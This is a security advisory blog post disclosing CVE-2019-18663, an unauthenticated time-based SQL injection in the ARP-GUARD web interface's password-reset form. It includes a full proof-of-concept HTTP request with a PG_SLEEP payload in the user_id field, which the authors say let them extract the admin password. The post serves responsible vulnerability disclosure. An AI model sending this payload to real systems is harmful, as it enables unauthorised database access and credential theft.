---
layout: post
title: "CVE-2019-18663: SQL-Injection in ARP-GUARD"
date:   2019-11-01 14:00:00
image:
      url: /assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg
video: false
comments: true
theme_color: 302F2D

author: 'Patrick Münch'

author_image: "https://avatars0.githubusercontent.com/u/7220740?s=400"
author_link: "https://twitter.com/atomiczero111"
---

# Overview

- Vendor: ISL Internet Sicherheitslösungen GmbH
- Product: ARP-GUARD
- Version: 4.0.0-5
- Vulnerability: SQL-Injection
- Fixed Version: 4.0.0-7

# Background

ARP-GUARD is a Network Access Control Solution to protect company networks against from unauthorised access. It identify allowed devices via their MAC address or certificates (802.1X).

From the vendor's website:
"ARP-GUARD makes sure that users don't use any unauthorised notebooks, smartphones or even wireless access points. Our software solution protects your IT infrastructure from malware-infected external devices and your intellectual property from unauthorised access! Our security solution provides reliable protection against unauthorised access to the internal LAN and WLAN, as well as the Internet. With ARP-GUARD, only authorized devices are granted access to your network!"

# Issue Description

While analyzing the implementation of the ARP-GUARD web interface, one SQL-Injection vulnerability has been identified, which can be exploited in order to read dump all database data, also the username and passwords for the web application. This vulnerability can be exploited by unauthenticated attackers with access to the web interface.

Please consider the following HTTP request:

__HTTP-Request__

~~~ http
POST /login/forgot1 HTTP/1.1
Host: 10.10.10.1
Connection: close
Content-Length: 119
Cache-Control: max-age=0
Origin: https://10.10.10.1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,
  like Gecko) Falkon/3.0.1 Chrome/69.0.3497.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,
image/webp,image/apng,*/*;q=0.8
Referer: https://10.10.10.1/login/forgot1
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.8
Cookie: session_id=whocares; S=whocares

answer=myniceanwser&check=Pr%C3%BCfen&username=username&user_id=
(SELECT 7529 FROM PG_SLEEP(10))
~~~

It was possible to extract the admin password for the web application via the time-based SQL-Injection.

# CVE

[CVE-2019-18663](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18663)

# CVSSv3 Base Score

CVSS Base Score: __8.1__

CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

# Credit

Pascal Keul of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)
Patrick Muench of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)
Torsten Löbner of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2019 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
